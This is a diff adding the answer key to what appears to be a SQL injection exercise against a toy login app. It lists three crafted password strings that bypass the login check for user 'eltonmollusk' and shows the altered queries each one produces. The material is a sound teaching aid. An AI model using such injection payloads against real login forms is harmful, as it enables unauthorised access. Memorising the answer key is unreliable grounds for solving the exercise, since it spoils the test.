@@ -1,0 +1,37 @@
+# BEGIN_SOLUTION
+
+username
+
+    eltonmollusk
+
+password
+
+    '='' AND username='eltonmollusk'--
+
+The two dashes start a line comment which discards the rest of the query.
+
+Enter the username and password and any message. The query will be
+
+    SELECT username FROM bird WHERE ''='' AND username='eltonmollusk'--' = password AND username = 'eltonmollusk'
+
+which evaluates to the rows [('eltonmollusk',)]. These rows pass the test below:
+
+    if len(rows) == 1 and rows[0][0] == username
+
+An alternative password is
+
+    eltonmollusk' = username OR '
+
+which will result in the query
+
+    SELECT username FROM bird WHERE 'eltonmollusk' = username OR '' = password and username = 'eltonmollusk'
+
+The shortest solution is probably
+
+    '='' AND NOT '
+
+resulting in the query
+
+    SELECT username FROM bird WHERE ''='' AND NOT '' = password AND username = 'eltonmollusk'
+
+# END_SOLUTION
